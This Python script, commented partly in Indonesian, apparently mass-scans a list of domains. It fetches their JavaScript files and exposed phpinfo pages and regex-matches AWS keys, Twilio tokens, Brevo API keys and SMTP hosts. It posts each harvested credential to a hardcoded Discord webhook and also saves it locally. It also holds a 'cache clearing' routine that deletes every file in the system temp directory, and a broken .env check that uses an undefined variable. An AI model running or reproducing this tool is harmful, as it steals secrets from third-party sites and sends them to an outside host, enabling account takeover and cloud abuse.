import os
import re
import httpx
import urllib3
import base64
import time
import tempfile
from typing import List
from multiprocessing import Pool
from dataclasses import dataclass
from datetime import datetime
import sys
from urllib.parse import urljoin
import shutil
from colorama import Fore, Style, init

# SMTP modules
import smtplib  # Untuk mengirim email melalui SMTP
from email.message import EmailMessage  # Untuk membuat email
import ssl  # Untuk koneksi aman (TLS/SSL)

# Initialize colorama
init(autoreset=True)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

@dataclass
class Color:
    RED = Fore.RED
    GREEN = Fore.GREEN
    YELLOW = Fore.YELLOW
    BLUE = Fore.BLUE
    PURPLE = Fore.MAGENTA
    CYAN = Fore.CYAN
    WHITE = Fore.WHITE
    RESET = Style.RESET_ALL

class MyClass:
    _BLACKLIST = [
        'cloudflare',
        'bootstrap',
        'jquery',
        '/wp-content/',
        'favicon',
        'google.com',
        'unpkg.com',
        'xtoken.market',
    ]

    _AWS_ACCESS_KEY_PATTERN = re.compile(r'AKIA[0-9A-Z]{16}')
    _AWS_SECRET_KEY_PATTERN = re.compile(r'(?<=[\'\"])[0-9a-zA-Z\/+]{40}(?=[\'\"])')
    _AWS_SECRETV2_KEY_PATTERN = re.compile(r'<td class="v">([0-9a-zA-Z\/+]{40})<\/td>') 
    _TWILIO_SID_PATTERN = re.compile(r'AC[a-f0-9]{32}')
    _TWILIO_AUTH_PATTERN = re.compile(r'(?i)[\'"]?([0-9a-f]{32})[\'"]?')
    _TWILIO_AUTH_PATTERN_V2 = re.compile(r'<td class="v">([0-9a-f]{32})<\/td>', re.IGNORECASE)
    _TWILIO_ENCODE_PATTERN = re.compile(r'QU[MN][A-Za-z0-9]{87}==')
    _AWS_SMTP_PATTERN = re.compile(r'email-smtp\.[a-z]{2}-[a-z]+-\d\.amazonaws\.com')
    _XKEYSIB_PATTERN = re.compile(r'xkeysib-[a-f0-9]{64}-[a-zA-Z0-9]{16}')
    _SERVERDATA_SMTP_PATTERN = re.compile(r'[a-zA-Z0-9-]+\.exch[0-9]+\.serverdata\.net')

    _JS_LINK_PATTERN = re.compile(
        r"""<script.*?src=["\']([^"\']*?\.(?:js|env|clj|conf|java|exs|hcl|go|sh|cnf|cs|tf|vue|json|xml|py|php|txt|yaml|yml|ini|sql|gz|zip|jsp|rb|ipynb|ts|aspx|asp|md|backup|dev|bak|rst|))[\'"].*?>|
            <link.*?href=["\']([^"\']*?\.(?:js|env|clj|conf|java|exs|hcl|go|sh|cnf|cs|tf|vue|json|xml|py|php|txt|yaml|yml|ini|sql|gz|zip|jsp|rb|ipynb|ts|aspx|asp|md|backup|dev|bak|rst|))[\'"].*?>""",
        re.IGNORECASE | re.VERBOSE
    )

    def __init__(self, output: str, webhook_url: str):
        self._output = output
        self._webhook_url = webhook_url
        self._blacklist_pattern = re.compile(
            '|'.join(self._BLACKLIST),
            re.IGNORECASE
        )
        self.detected_phpinfo_pairs = set()
        self.detected_dir_pairs = set()
        self.processed_urls = set()
    def _is_valid_base64(self, s: str) -> bool:
        """Check if string is likely valid base64"""
        # Periksa panjang string
        if len(s) % 4 != 0 and not s.endswith(('=', '==')):
            return False
        
        # Periksa karakter yang valid
        try:
            return bool(re.match('^[A-Za-z0-9+/]*={0,2}$', s))
        except TypeError:
            return False

    def _is_valid_aws_secret(self, secret: str) -> bool:
        """Validasi format AWS Secret Key"""
        if len(secret) != 40:
            return False
        
        has_letter = any(c.isalpha() for c in secret)
        has_number = any(c.isdigit() for c in secret)
        valid_chars = set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/')
        all_valid_chars = all(c in valid_chars for c in secret)
        
        return has_letter and has_number and all_valid_chars
                    
    def _save_into_file(self, url: str, filename: str, output_dir: str):
        """Save the found URL into the specified file in the output directory"""
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
        with open(os.path.join(output_dir, filename), mode='a') as f:
            f.write(url + '\n')

    def _send_discord_webhook(self, url: str, key_type: str, key_value: str):
        current_time = datetime.now().strftime("%m/%d/%Y %I:%M %p")
        payload = {
            "content": f"```diff\n+ XX Result\n\nLeaks Links :\n{url}\n\n{key_type} Detected :\n{key_value}\n\n{current_time}```"
        }
        try:
            httpx.post(self._webhook_url, json=payload)
        except Exception as e:
            print(f'{Color.RED}[ERROR]{Color.RESET} Failed to send webhook notification: {e}')

    def is_valid_twilio_auth_token(auth_token: str) -> bool:
        if re.match(r'^[a-f0-9]{32}$', auth_token):  # Memastikan panjangnya 32 karakter heksadesimal
            return bool(re.search(r'[a-f]', auth_token) and re.search(r'[0-9]', auth_token))
        return False


    def _extract_js_from_body(self, body: str, protocol: str, domain: str):
        js_files = set()

        matches = self._JS_LINK_PATTERN.findall(body)
        for match in matches:
            script_src = match[0]
            link_href = match[1]
            if script_src and not self._blacklist_pattern.search(script_src):
                js_url = urljoin(f'{protocol}://{domain}', script_src)
                js_files.add(js_url)
            elif link_href and not self._blacklist_pattern.search(link_href):
                js_url = urljoin(f'{protocol}://{domain}', link_href)
                js_files.add(js_url)

        if not js_files:
            return

        print(f'{Color.GREEN}[FOUND]{Color.RESET} {protocol}://{domain} {Color.BLUE} -> {Color.GREEN}{len(js_files)}{Color.RESET}')
        for js_url in js_files:
            self._check_for_aws_or_other_keys(js_url)
    
    def _check_for_aws_or_other_keys(self, url: str):
        try:
            # Fetching the URL content
            response = httpx.get(url, verify=False, timeout=10)
            
            # AWS Access and Secret Keys
            access_keys = self._AWS_ACCESS_KEY_PATTERN.findall(response.text)
            secret_keys = self._AWS_SECRET_KEY_PATTERN.findall(response.text)
            
            # Twilio SID and Auth Tokens
            twilio_sids = self._TWILIO_SID_PATTERN.findall(response.text)
            twilio_auth_tokens = self._TWILIO_AUTH_PATTERN.findall(response.text)
            twilio_encoded_keys = self._TWILIO_ENCODE_PATTERN.findall(response.text)
            #SMTP SMTP
            smtp_hosts = self._AWS_SMTP_PATTERN.findall(response.text)
            smtp_hostis = self._SERVERDATA_SMTP_PATTERN.findall(response.text)
            xkeysibkeys = self._XKEYSIB_PATTERN.findall(response.text)
            
            # Proses dan laporkan AWS Keys
            if access_keys and secret_keys:
                for access_key in list(set(access_keys)):
                    for secret_key in list(set(secret_keys)):
                        if re.search(r'[A-Z]', secret_key) and re.search(r'[0-9]', secret_key):
                            aws_cred = f'{access_key}|{secret_key}|us-east-1'
                            print(f'{Color.PURPLE}[FOUND]{Color.RESET} {url} -> AWS Credentials: {aws_cred}')
                            self._send_discord_webhook(url, "AWS Access Key", aws_cred)
                            self._save_into_file(f'{url}\n{aws_cred}', 'AWSJS_CREDENTIALS.txt', 'RESULTS/RESULT_AWS')
            
            # Proses dan laporkan Twilio SID dan Auth Tokens
            if twilio_sids and twilio_auth_tokens:
                for sid in list(set(twilio_sids)):
                    for auth_token in list(set(twilio_auth_tokens)):
                        if re.match(r'^[a-f0-9]{32}$', auth_token) and re.search(r'[a-f]', auth_token) and re.search(r'[0-9]', auth_token):
                            twilio_cred = f'{sid}|{auth_token}'
                            print(f'{Color.BLUE}[FOUND]{Color.RESET} {url} -> Twilio Credentials: {twilio_cred}')
                            self._send_discord_webhook(url, "Twilio SID/Auth Token", twilio_cred)
                            self._save_into_file(f'{url}\n{twilio_cred}', 'TWILIOJS_CREDENTIALS.txt', 'RESULTS/RESULT_TWILIO')

            # Proses dan laporkan Twilio Encoded Keys
            if twilio_encoded_keys:
                for encoded_key in set(twilio_encoded_keys):
                    try:
                        decoded_bytes = base64.b64decode(encoded_key)
                        decoded_str = decoded_bytes.decode('utf-8')
                        print(f'{Color.BLUE}[DECODED]{Color.RESET} Encoded Twilio string found: {encoded_key}')
                        print(f'{Color.PURPLE}[DECODED]{Color.RESET} Decoded content: {decoded_str}')
                        
                        # Decode Twilio SID/Auth token if present
                        sid, auth_token = decoded_str.split(':')
                        if sid.startswith('AC') and len(sid) == 34 and len(auth_token) == 32:
                            twilio_cred = f'{sid}:{auth_token}'
                            print(f'{Color.GREEN}[FOUND]{Color.RESET} {url} -> Decoded Twilio Credentials: {twilio_cred}')
                            self._send_discord_webhook(url, "Twilio Encoded Credentials", twilio_cred)
                            self._save_into_file(f'{url}\n{twilio_cred}', 'TWILIO-DECODE_CREDENTIALS.txt', 'RESULTS/RESULT_JS')

                    except (base64.binascii.Error, UnicodeDecodeError) as decode_error:
                        print(f'{Color.RED}[ERROR]{Color.RESET} Failed to decode Twilio encoded string: {encoded_key} -> {decode_error}')
            
            # XKEYSIB BREVO
            
            if xkeysibkeys:
                for xkeysib_key in list(set(xkeysibkeys)):
                    print(f'{Color.BLUE}[FOUND]{Color.RESET} {url} -> XKEYSIB_BREVO: {xkeysib_key}')
                    self._send_discord_webhook(url, "XKEYSIB_BREVO", xkeysib_key)
                    self._save_into_file(f'{url}\n{xkeysib_key}', 'XKEYSIB_CREDENTIALS.txt', 'RESULTS/RESULT_AWS')
            
            # SMTP AWS
            if smtp_hosts:
                for smtp_host in list(set(smtp_hosts)):
                    print(f'{Color.BLUE}[FOUND]{Color.RESET} {url} -> AWS_SMTP: {smtp_host}')
                    self._send_discord_webhook(url, "SMTP_AWS", smtp_host)
                    self._save_into_file(f'{url}\n{smtp_host}', 'AWSSMTPJS_CREDENTIALS.txt', 'RESULTS/RESULT_AWS')
            
            # SERVERDATA SMTP
            if smtp_hostis:
                for smtp_hosti in list(set(smtp_hostis)):
                    print(f'{Color.BLUE}[FOUND]{Color.RESET} {url} -> SERVERDATA_SMTP: {smtp_hosti}')
                    self._send_discord_webhook(url, "SMTP_SERVERDATA", smtp_hosti)
                    self._save_into_file(f'{url}\n{smtp_hosti}', 'SERVERDATASMTPJS_CREDENTIALS.txt', 'RESULTS/RESULT_AWS')
            
            # If no sensitive keys were found
            if not (access_keys or secret_keys or twilio_sids or twilio_auth_tokens or  twilio_encoded_keys or smtp_hosts or smtp_hostis or xkeysibkeys):
                print(f'{Color.YELLOW}[NOT FOUND]{Color.RESET} No sensitive keys found in {url}')

        except Exception as e:
            print(f'{Color.RED}[ERROR]{Color.RESET} Failed to fetch URL: {url} -> {e}')

    def _check_for_keys_in_phpinfo(self, content: str, url: str):
        access_keys = self._AWS_ACCESS_KEY_PATTERN.findall(content)
        secret_keys = self._AWS_SECRETV2_KEY_PATTERN.findall(content)
        twilio_sids = self._TWILIO_SID_PATTERN.findall(content)
        twilio_auth = self._TWILIO_AUTH_PATTERN_V2.findall(content)
        smtp_hostis = self._SERVERDATA_SMTP_PATTERN.findall(content)
        smtp_hosts = self._AWS_SMTP_PATTERN.findall(content)
        xkeysibkeys = self._XKEYSIB_PATTERN.findall(content)

        # Proses dan laporkan AWS Keys
        if access_keys and secret_keys:
            # Cocokkan pasangan Access Key dan Secret Key menggunakan zip
            for access_key, secret_key in zip(access_keys, secret_keys):
                unique_pair = (url, access_key, secret_key)
                if unique_pair not in self.detected_dir_pairs:
                    self.detected_dir_pairs.add(unique_pair)
                    aws_cred = f'{access_key}|{secret_key}|us-east-1'
                    print(f'{Color.PURPLE}[FOUND]{Color.RESET} {url} -> AWS Credentials: {aws_cred}')
                    self._send_discord_webhook(url, "AWS Access Key", aws_cred)
                    self._save_into_file(f'{url} - {aws_cred}', 'AWSPHP_CREDENTIALS.txt', 'RESULTS/RESULT_AWS')
        
        # Proses dan laporkan Twilio Credentials
        if twilio_sids and twilio_auth:
            for twilio_sid in set(twilio_sids):
                for auth_token in set(twilio_auth):
                    if re.match(r'^[a-f0-9]{32}$', auth_token) and re.search(r'[a-f]', auth_token) and re.search(r'[0-9]', auth_token):
                        unique_pair = (url, twilio_sid, auth_token)
                        if unique_pair not in self.detected_dir_pairs:
                            self.detected_dir_pairs.add(unique_pair)
                            twilio_cred = f'{twilio_sid}|{auth_token}'
                            print(f'{Color.GREEN}[FOUND]{Color.RESET} {url} -> Twilio Credentials: {twilio_cred}')
                            self._send_discord_webhook(url, "Twilio Credentials", twilio_cred)
                            self._save_into_file(f'{url} - {twilio_cred}', 'TWILIOPHP_CREDENTIALS.txt', 'RESULTS/RESULT_TWILIO')
        # XKEYSIB BREVO
        if xkeysibkeys:
                for xkeysib_key in list(set(xkeysibkeys)):
                 unique_pair = (url, xkeysib_key)
                 if unique_pair not in self.detected_dir_pairs:
                    self.detected_dir_pairs.add(unique_pair)
                    print(f'{Color.BLUE}[FOUND]{Color.RESET} {url} -> AWS_SMTP: {xkeysib_key}')
                    self._send_discord_webhook(url, "xkeysib_brevo", xkeysib_key)
                    self._save_into_file(f'{url}\n{xkeysib_key}', 'xkeysibphp_CREDENTIALS.txt', 'RESULTS/RESULT_AWS')
        
        # SMTP_AWS
        if smtp_hosts:
                for smtp_host in list(set(smtp_hosts)):
                 unique_pair = (url, smtp_host)
                 if unique_pair not in self.detected_dir_pairs:
                    self.detected_dir_pairs.add(unique_pair)
                    print(f'{Color.BLUE}[FOUND]{Color.RESET} {url} -> AWS_SMTP: {smtp_host}')
                    self._send_discord_webhook(url, "SMTP_AWS", smtp_host)
                    self._save_into_file(f'{url}\n{smtp_host}', 'AWSSMTPPHP_CREDENTIALS.txt', 'RESULTS/RESULT_AWS')
        
        # SERVERDATA SMTP
        if smtp_hostis:
                for smtp_hosti in list(set(smtp_hostis)):
                  unique_pair = (url, smtp_hosti)
                  if unique_pair not in self.detected_dir_pairs:
                    self.detected_dir_pairs.add(unique_pair)
                    print(f'{Color.BLUE}[FOUND]{Color.RESET} {url} -> SERVERDATA_SMTP: {smtp_hosti}')
                    self._send_discord_webhook(url, "SMTP_SERVERDATA", smtp_hosti)
                    self._save_into_file(f'{url}\n{smtp_hosti}', 'SERVERDATASMTPPHP_CREDENTIALS.txt', 'RESULTS/RESULT_AWS')
        
        # Jika tidak ada keys ditemukan
        if not (access_keys or secret_keys or twilio_sids or twilio_auth or smtp_hosts or smtp_hostis or xkeysibkeys):
            print(f'{Color.YELLOW}[NOT FOUND]{Color.RESET} No sensitive keys found in {url}')

    def _create_request(self, domain: str):
        protocol = 'http'
        if '://' in domain:
            protocol, domain = domain.split('://')
        if domain.endswith('/'):
            domain = domain[:-1]
        
        # Daftar jalur umum untuk phpinfo dan .env
        common_phpinfo_paths = [
            '/phpinfo.php',
            '/phpinfo',
            '/php_info.php',
            '/_profiler/phpinfo',
            '/info.php'
        ]
        

        base_url = f'{protocol}://{domain}'
        
        try:
            # Permintaan HTTP ke domain utama untuk JavaScript files
            body_response = httpx.get(
                url=base_url,
                verify=False,
                timeout=10,
                follow_redirects=True,
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
                }
            )
            
            # Memeriksa JavaScript pada domain utama
            self._extract_js_from_body(
                body_response.text,
                body_response.url.scheme,
                domain
            )

            # Memeriksa berbagai jalur phpinfo.php atau serupa
            for path in common_phpinfo_paths:
                phpinfo_url = f'{base_url}{path}'
                
                try:
                    timeout = httpx.Timeout(connect=5.0, read=15.0, write=5.0, pool=10.0)
                    phpinfo_response = httpx.get(
                        url=phpinfo_url,
                        verify=False,
                        timeout=timeout,
                        follow_redirects=True,
                        headers={
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
                        }
                    )
                    
                    # Jika halaman ditemukan (status 200)
                    if phpinfo_response.status_code == 200:
                        # Memeriksa apakah halaman tampak seperti hasil dari phpinfo()
                        if 'PHP Version' in phpinfo_response.text or '<table' in phpinfo_response.text:
                            print(f'{Color.GREEN}[FOUND]{Color.RESET} {phpinfo_url} -> phpinfo detected')
                            self._check_for_keys_in_phpinfo(phpinfo_response.text, phpinfo_url)
                
                except httpx.HTTPError as e:
                    print(f'{Color.RED}[ERROR]{Color.RESET} Failed to fetch {phpinfo_url} -> {e}')

            
                try:
                    timeout = httpx.Timeout(connect=10.0, read=25.0, write=15.0, pool=20.0)
                    env_response = httpx.get(
                        url=env_url,
                        verify=False,
                        timeout=timeout,
                        follow_redirects=True,
                        headers={
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
                        }
                    )
                
                except httpx.HTTPError as e:
                    print(f'{Color.RED}[ERROR]{Color.RESET} Failed to fetch {env_url} -> {e}')

        except httpx.HTTPError as e:
            print(f'{Color.RED}[ERROR]{Color.RESET} {protocol}://{domain} {Color.BLUE} -> {Color.YELLOW}{e.__class__.__name__}{Color.RESET}')

    def _clear_cache(self):
        """Fungsi untuk membersihkan cache dengan output berwarna."""
        print(f"{Color.RED}[INFO]{Color.RESET} Starting cache clearing...")
        try:
            # Bersihkan cache DNS
            print(f"{Color.RED}[INFO]{Color.RESET} Clearing DNS cache...")
            if os.name == 'nt':  # Windows
                os.system("ipconfig /flushdns")
            else:  # Linux/MacOS
                os.system("sudo systemd-resolve --flush-caches")

            # Tentukan cache_path secara otomatis
            cache_path = tempfile.gettempdir()  # Direktori sementara sistem operasi
            print(f"{Color.RED}[INFO]{Color.RESET} Clearing local cache at {cache_path}...")

            # Hapus semua file di direktori sementara
            for root, dirs, files in os.walk(cache_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    try:
                        os.remove(file_path)
                        print(f"{Color.GREEN}[INFO]{Color.RESET} Removed file: {file_path}")
                    except Exception as e:
                        print(f"{Color.RED}[WARNING]{Color.RESET} Could not remove {file_path}: {e}")

                for dir_ in dirs:
                    dir_path = os.path.join(root, dir_)
                    try:
                        shutil.rmtree(dir_path, ignore_errors=True)
                        print(f"{Color.GREEN}[INFO]{Color.RESET} Removed directory: {dir_path}")
                    except Exception as e:
                        print(f"{Color.RED}[WARNING]{Color.RESET} Could not remove {dir_path}: {e}")

        except Exception as e:
            print(f"{Color.RED}[WARNING]{Color.RESET} Failed to clear cache: {e}")

    def _run(self, urls: List[str]):
        max_processes = 80  # Sesuaikan jumlah proses dengan kapasitas sistem
        clear_cache_interval = 800  # Interval pembersihan cache dalam detik (contoh: 3600 untuk 1 jam)
        start_time = time.time()

        try:
            with Pool(processes=max_processes) as pool:
                for url in urls:
                    pool.apply_async(self._create_request, (url,))
                
                pool.close()
                pool.join()

                # Periksa apakah perlu membersihkan cache
                elapsed_time = time.time() - start_time
                print(f"{Color.YELLOW}[DEBUG]{Color.RESET} Elapsed time: {elapsed_time} seconds")  # Tambahkan log ini
                if elapsed_time >= clear_cache_interval:
                    print(f"{Color.GREEN}[INFO]{Color.RESET} Clearing cache...")
                    self._clear_cache()
                    start_time = time.time()  # Reset waktu
        except Exception as e:
            print(f"{Color.RED}[ERROR]{Color.RESET} Scan process failed: {e}")

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 sc.py <list_file>")
        sys.exit(1)
        
    list_file = sys.argv[1]
    output_file = "resultaws.txt"
    webhook_url = "https://discord.com/api/webhooks/1286348247618687046/J7b_xcmtXAdZcIS3eplgFZOvhrTIGWL-SU1W_DtnNmkQ52NlOSFQgvZI9zuuaJjOHVhV" #change webhook here!
    
    myclass = MyClass(output_file, webhook_url)
    
    with open(list_file, mode='r') as file:
        urls = [line.strip() for line in file if line.strip()]
    
    myclass._run(urls)
    
    print(f'{Color.GREEN}[INFO]{Color.RESET} Scan completed. All URLs processed successfully.')

if __name__ == '__main__':
    main()
